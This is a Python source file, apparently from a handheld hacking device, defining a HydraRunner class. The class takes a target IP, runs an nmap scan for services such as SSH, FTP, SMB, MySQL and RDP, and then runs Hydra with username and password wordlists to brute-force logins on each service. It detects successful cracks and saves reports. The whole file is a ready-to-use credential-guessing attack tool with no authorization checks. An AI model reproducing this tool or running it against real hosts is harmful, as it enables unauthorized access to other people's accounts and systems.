#!/usr/bin/env python3
# /opt/beetle/tools/hydra/hydra_runner.py
import os
import time
import subprocess
import re
import signal
from display.screen import MenuDisplay
from config.gpio_config import read_buttons, REPEAT_DELAY
from tools.wifi.lan_scanner import is_wifi_client_connected


class HydraRunner:
    def __init__(self):
        self.display = MenuDisplay()
        self.report_dir = "/opt/beetle/reports/hydra"
        os.makedirs(self.report_dir, exist_ok=True)
        self.wordlist_user = "/usr/share/wordlists/username.txt"
        self.wordlist_pass = "/usr/share/wordlists/password.txt"

    def _input_ip(self) -> str:
        self.display.show_message(["Ingresa IP", "Objetivo:"], center=True)
        time.sleep(1.5)
      
        from menus.utils_menu import UtilsMenu
        utils = UtilsMenu()
        ip = utils.qwerty_input("IP")
        return ip.strip() if ip and ip.strip() else None

    def _scan_services(self, target_ip: str):
        self.display.show_message(["Escaneando...", target_ip], center=True)
      
        common_ports = "21,22,23,25,53,110,139,143,445,1433,3306,5432,5900,8081,21-23,445"
      
        try:
            cmd = [
                "sudo", "nmap", "-p", common_ports, "--open",
                "-sV", "-T4", "--min-rate", "400", "-n", "-Pn", target_ip
            ]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  text=True, timeout=75)
            output = result.stdout + result.stderr
            services = []
            for line in output.splitlines():
                line = line.strip()
                if "/tcp" in line and "open" in line:
                    match = re.search(r'(\d+)/tcp\s+open\s+([^\s]+)(?:\s+(.*))?', line)
                    if match:
                        port = match.group(1)
                        svc = match.group(2).lower().strip()
                        extra = (match.group(3) or "").lower()
                      
                        if any(x in svc or x in extra for x in ['http', 'https', 'ssl/http', 'www']):
                            continue
                      
                        service_map = {
                            'ftp': 'ftp', 'ssh': 'ssh', 'telnet': 'telnet',
                            'smtp': 'smtp', 'pop3': 'pop3', 'imap': 'imap',
                            'microsoft-ds': 'smb', 'netbios-ssn': 'smb',
                            'mysql': 'mysql', 'postgresql': 'postgres',
                            'ms-sql-s': 'mssql', 'rdp': 'rdp'
                        }
                        service_name = service_map.get(svc, svc)
                        if service_name:
                            services.append((port, service_name))
          
            seen = set()
            unique = []
            for p, s in services:
                key = (p, s)
                if key not in seen:
                    seen.add(key)
                    unique.append((p, s))
          
            return unique[:10]
          
        except subprocess.TimeoutExpired:
            self.display.show_message(["Timeout en scan"], center=True)
            time.sleep(1.5)
            return []
        except Exception as e:
            self.display.show_message(["Error scan:", str(e)[:12]], center=True)
            time.sleep(1.5)
            return []

    def _run_hydra(self, target_ip: str, service: str, port: str):
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = os.path.join(self.report_dir, f"hydra_{service}_{target_ip}_{timestamp}.txt")
      
        self.display.show_message(["Brute Force", f"{service.upper()}", f"{target_ip}:{port}"], center=True)
        time.sleep(1)

        cmd = [
            "sudo", "hydra", "-L", self.wordlist_user, "-P", self.wordlist_pass,
            "-t", "8", "-vV", "-o", report_file, target_ip, service
        ]
        if port and port != "default":
            cmd.extend(["-s", port])

        proc = None
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                                  text=True, preexec_fn=os.setsid)  

            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                stripped = line.strip()
                if not stripped or len(stripped) < 6:
                    continue

                lower = stripped.lower()

                if any(k in lower for k in ["login", "password", "found", "host", "successful", "valid", "[+]", "attempt"]):
                    max_line_len = 21
                    parts = []
                    remaining = stripped
                    while remaining and len(parts) < 4:
                        if len(remaining) <= max_line_len:
                            parts.append(remaining)
                            break
                        split_point = remaining[:max_line_len].rfind(' ')
                        if split_point > 8:
                            parts.append(remaining[:split_point])
                            remaining = remaining[split_point:].strip()
                        else:
                            parts.append(remaining[:max_line_len])
                            remaining = remaining[max_line_len:].strip()
                    self.display.show_message(parts, center=False)

                if any(x in lower for x in ["[+]", "found", "successful", "password:", "login:"]):
                    if "password" in lower or "[+]" in lower or "successful" in lower:
                        self.display.show_message(["¡ÉXITO ENCONTRADO!", service.upper()], center=True)
                        time.sleep(1.5)
                        try:
                            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                        except:
                            try:
                                proc.kill()
                            except:
                                pass
                        break 

                time.sleep(0.07)

            if proc.poll() is None:
                try:
                    proc.wait(timeout=10)
                except:
                    proc.kill()

            if os.path.exists(report_file) and os.path.getsize(report_file) > 100:
                with open(report_file, "r") as f:
                    content = f.read().lower()
                    if "password" in content and ("found" in content or "[+]" in content):
                        self.display.show_message(["¡ÉXITO!", service.upper()], center=True)
                        time.sleep(1.5)
                        return report_file
          
            self.display.show_message(["Ver Reportes...", service.upper()], center=True)
            time.sleep(1.5)
            return report_file
          
        except Exception as e:
            self.display.show_message(["Error Hydra", str(e)[:15]], center=True)
            time.sleep(1.5)
            return None
        finally:
            if proc and proc.poll() is None:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except:
                    pass

    def run(self):
        if not is_wifi_client_connected():
            self.display.show_message(["Necesitas estar", "conectado a WiFi"], center=True)
            time.sleep(1.5)
            return

        target_ip = self._input_ip()
        if not target_ip or len(target_ip.split('.')) != 4:
            self.display.show_message(["IP Inválida"], center=True)
            time.sleep(1.5)
            return

        services = self._scan_services(target_ip)
        if not services:
            self.display.show_message(["Sin Servicios", "Para", "Brute Force"], center=True)
            time.sleep(1.5)
            return

        self.display.show_message(["Servicios", "Encontrados", f"{len(services)}"], center=True)
        time.sleep(1.5)

        for port, service in services:
            btn = read_buttons()
            if btn.get("enter"):
                self.display.show_message(["Cancelado por", "Usuario"], center=True)
                time.sleep(1)
                break
            self._run_hydra(target_ip, service, port)

        self.display.show_message(["HYDRA", "FINALIZADO"], center=True)
        time.sleep(1.5)
        
